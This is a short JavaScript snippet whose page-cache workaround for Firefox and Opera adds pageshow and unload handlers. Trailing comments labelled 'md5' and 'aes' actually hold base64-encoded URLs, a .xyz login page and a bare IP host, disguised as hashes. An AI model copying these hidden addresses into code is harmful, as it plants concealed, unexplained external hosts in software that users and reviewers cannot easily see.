if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cuaHZzc2wueHl6L2luZGV4L3VzZXIvbG9naW4uaHRtbD89Mg==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/